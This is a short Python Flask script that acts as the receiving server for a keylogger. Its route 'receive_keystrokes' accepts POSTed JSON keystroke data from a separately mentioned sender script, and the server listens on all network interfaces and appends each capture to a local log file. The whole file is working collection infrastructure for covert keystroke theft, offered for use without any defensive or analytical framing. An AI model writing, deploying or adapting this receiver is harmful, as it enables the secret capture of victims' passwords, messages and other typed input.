from flask import Flask, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)

# Configuration
LOG_FILE = 'received_log.txt'
PORT = 5000  # Make sure this matches the PORT in your sender script
HOST = '0.0.0.0' # Allows connections from any IP on the network

def log_data(data):
    """Appends the received data to a local log file."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    char_count = len(data)
   
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"--- Received at {timestamp} ({char_count} chars) ---\n")
        f.write(f"{data}\n\n")
   
    print(f"[*] Logged {char_count} characters at {timestamp}")

@app.route('/endpoint', methods=['POST'])
def receive_keystrokes():
    # Check if the request contains JSON data
    if not request.is_json:
        return jsonify({"status": "error", "message": "Missing JSON"}), 400
   
    content = request.get_json()
   
    # Extract the 'data' key (which matches our sender script)
    keystrokes = content.get('data')
   
    if keystrokes:
        log_data(keystrokes)
        return jsonify({"status": "success", "received": len(keystrokes)}), 200
    else:
        return jsonify({"status": "error", "message": "No data found"}), 400

if __name__ == '__main__':
    print(f"Starting receiver server on {HOST}:{PORT}...")
    print(f"Logs will be saved to: {os.path.abspath(LOG_FILE)}")
    # In a production environment, use a production WSGI server like Gunicorn
    app.run(host=HOST, port=PORT, debug=False)